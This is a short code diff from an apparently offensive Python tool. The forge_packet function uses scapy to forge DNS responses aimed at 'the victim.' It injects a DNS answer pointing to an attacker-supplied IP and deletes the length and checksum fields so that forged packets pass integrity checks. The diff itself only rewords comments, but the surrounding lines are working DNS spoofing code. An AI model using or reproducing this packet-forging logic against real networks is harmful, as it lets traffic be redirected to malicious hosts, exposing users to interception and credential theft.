@@ -29,11 +29,10 @@ def forge_packet(scapy_packet):
         answer = scapy.DNSRR(rrname=qname, rdata=options.ip)
         scapy_packet[scapy.DNS].an = answer
         # Modify the packet ancount with 1,
-        # as we are sent a single DNSRR to the victim.
+        # We are sent a single DNSRR to the victim.
         scapy_packet[scapy.DNS].ancount = 1
-        # Packet corruption can be detected using the
-        # checksum and other information. By deleting them
-        # scapy generates new entries for them.
+        # Packet corruption can be detected using the checksum and
+        # len fields. By deleting these scapy generates new entries.
         del scapy_packet[scapy.IP].len
         del scapy_packet[scapy.IP].chksum
         del scapy_packet[scapy.UDP].chksum
